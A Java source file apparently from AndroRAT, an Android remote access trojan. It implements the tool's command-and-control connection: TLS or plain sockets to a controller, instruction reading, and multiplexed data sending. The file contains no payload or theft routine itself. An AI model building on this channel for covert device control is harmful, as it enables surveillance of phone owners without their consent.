//package InOut;

package out;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.security.KeyStore;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLServerSocket;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManagerFactory;



import out.Mux;

import in.Demux;
import in.Receiver;
import inout.Controler;

public class Connection
{
	Socket s;
	String ip = "localhost";
	int port = 5555;
	DataOutputStream out;
	DataInputStream in;
	
	boolean stop = false;
	ByteBuffer readInstruction;
	Mux m;
	Demux dem ;
	Controler controler;
	Receiver receive ;
	
	// SSL/TLS configuration
	private String keystorePath = "keystore.jks";
	private String keystorePassword = "changeit";
	private boolean useSSL = true;

	public Connection(String ip, int port)
	{
		this.ip = ip;
		this.port = port;
		// Load SSL configuration from system properties if available
		String sslEnabled = System.getProperty("androrat.ssl.enabled", "true");
		this.useSSL = Boolean.parseBoolean(sslEnabled);
		this.keystorePath = System.getProperty("androrat.keystore.path", "keystore.jks");
		this.keystorePassword = System.getProperty("androrat.keystore.password", "changeit");
	}

	public Connection(String ip, int port, Controler ctrl)
	{
		this.ip = ip;
		this.port = port;
		this.controler = ctrl;
		// Load SSL configuration from system properties if available
		String sslEnabled = System.getProperty("androrat.ssl.enabled", "true");
		this.useSSL = Boolean.parseBoolean(sslEnabled);
		this.keystorePath = System.getProperty("androrat.keystore.path", "keystore.jks");
		this.keystorePassword = System.getProperty("androrat.keystore.password", "changeit");
	}
	
	/**
	 * Creates an SSL context for secure connections.
	 * @return Configured SSLContext
	 * @throws Exception if SSL context cannot be created
	 */
	private SSLContext createSSLContext() throws Exception {
		// Load keystore
		KeyStore keyStore = KeyStore.getInstance("JKS");
		try (FileInputStream fis = new FileInputStream(keystorePath)) {
			keyStore.load(fis, keystorePassword.toCharArray());
		}
		
		// Initialize key manager factory
		KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
		kmf.init(keyStore, keystorePassword.toCharArray());
		
		// Initialize trust manager factory
		TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());
		tmf.init(keyStore);
		
		// Create SSL context
		SSLContext sslContext = SSLContext.getInstance("TLSv1.2");
		sslContext.init(kmf.getKeyManagers(), tmf.getTrustManagers(), null);
		
		return sslContext;
	}

	public boolean connect()
	{
		try
		{
			if (useSSL) {
				// Create SSL socket for encrypted connection
				SSLContext sslContext = createSSLContext();
				SSLSocket sslSocket = (SSLSocket) sslContext.getSocketFactory().createSocket(ip, port);
				
				// Enable strong cipher suites only
				String[] enabledCipherSuites = {
					"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
					"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
					"TLS_DHE_RSA_WITH_AES_256_GCM_SHA384",
					"TLS_DHE_RSA_WITH_AES_128_GCM_SHA256"
				};
				sslSocket.setEnabledCipherSuites(enabledCipherSuites);
				
				// Enable TLS 1.2 and 1.3 only
				String[] enabledProtocols = {"TLSv1.2", "TLSv1.3"};
				sslSocket.setEnabledProtocols(enabledProtocols);
				
				// Start handshake
				sslSocket.startHandshake();
				
				s = sslSocket;
			} else {
				// Fallback to plain socket (not recommended for production)
				System.err.println("WARNING: SSL/TLS is disabled. Connection is not encrypted!");
				s = new Socket(ip, port);
			}
			
			in = new DataInputStream(s.getInputStream());
			out = new DataOutputStream(s.getOutputStream());
			m = new Mux(out);
			dem = new Demux(controler, "moi");
			receive = new Receiver(s);
			return true;
		} catch (IOException e)
		{
			e.printStackTrace();
			return false;
		} catch (Exception e)
		{
			System.err.println("SSL/TLS initialization failed: " + e.getMessage());
			e.printStackTrace();
			return false;
		}
	}

	public boolean reconnect()
	{
		return connect();
	}

	public boolean accept(ServerSocket ss)
	{
		try
		{
			s = ss.accept();
			
			// If this is an SSL server socket, the accepted socket will already be an SSLSocket
			if (s instanceof SSLSocket) {
				SSLSocket sslSocket = (SSLSocket) s;
				
				// Enable strong cipher suites only
				String[] enabledCipherSuites = {
					"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
					"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
					"TLS_DHE_RSA_WITH_AES_256_GCM_SHA384",
					"TLS_DHE_RSA_WITH_AES_128_GCM_SHA256"
				};
				sslSocket.setEnabledCipherSuites(enabledCipherSuites);
				
				// Enable TLS 1.2 and 1.3 only
				String[] enabledProtocols = {"TLSv1.2", "TLSv1.3"};
				sslSocket.setEnabledProtocols(enabledProtocols);
				
				// Require client authentication
				sslSocket.setNeedClientAuth(true);
				
				// Start handshake
				sslSocket.startHandshake();
			} else {
				System.err.println("WARNING: Accepted connection is not encrypted!");
			}

			in = new DataInputStream(s.getInputStream());
			out = new DataOutputStream(s.getOutputStream());
			m = new Mux(out);
			return true;

		} catch (IOException e)
		{

			e.printStackTrace();
			return false;
		}
	}

	public ByteBuffer getInstruction() throws Exception
	{
		readInstruction = receive.read();
		
		if(dem.receive(readInstruction))
			readInstruction.compact();
		else
			readInstruction.clear();
		
		return readInstruction;
	}

	public void sendData(int chan, byte[] packet)
	{
		m.send(chan, packet);
	}
	
	public void stop() {
		try {
			s.close();
		} catch (IOException e) {
			
		}
	}
}